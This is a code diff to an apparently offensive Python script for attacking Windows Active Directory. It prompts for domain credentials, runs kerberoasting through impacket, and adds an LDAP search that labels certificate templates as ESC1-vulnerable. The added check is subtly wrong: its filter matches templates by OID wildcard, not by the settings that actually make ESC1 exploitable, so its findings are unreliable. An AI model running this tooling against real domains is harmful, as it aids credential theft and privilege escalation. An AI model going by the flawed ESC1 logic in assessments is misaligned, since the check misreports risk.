@@ -2,6 +2,7 @@ from impacket.krb5.asn1 import AP_REQ
 from impacket.krb5.types import Principal
 from impacket.ntlm import compute_lmhash, compute_nthash
 from impacket.smbconnection import SMBConnection
+from ldap3 import Server, Connection, ALL_ATTRIBUTES, ALL
 
 def kerberos_auth(username, password, domain, dc_ip):
     try:
@@ -59,6 +60,31 @@ def extract_kerberoastable_accounts(tgt):
         print(f"Error while extracting kerberoastable accounts: {e}")
         return []
 
+def check_esc1_vulnerability(username, password, domain, dc_ip):
+    try:
+        # Connect to the Domain Controller LDAP
+        server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
+        conn = Connection(server, user=f"{username}@{domain}", password=password, authentication='NTLM', auto_bind=True)
+
+        # Search for vulnerable certificate templates
+        conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
+                    search_filter='(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.*))',
+                    attributes=['cn'])
+
+        results = conn.entries
+        conn.unbind()
+
+        if results:
+            print("Vulnerable Certificate Templates (ESC1):")
+            for result in results:
+                print(result.cn)
+        else:
+            print("No vulnerable certificate templates found.")
+
+    except Exception as e:
+        print(f"Error while searching for ESC1 certificate templates: {e}")
+
+
 # Example usage:
 username = input("Enter username: ")
 password = input("Enter password: ")
@@ -66,3 +92,4 @@ domain = input("Enter domain: ")
 dc_ip = input("Enter domain controller IP or hostname: ")
 
 kerberoast(domain, username, password, dc_ip)
+check_esc1_vulnerability(username, password, domain, dc_ip)
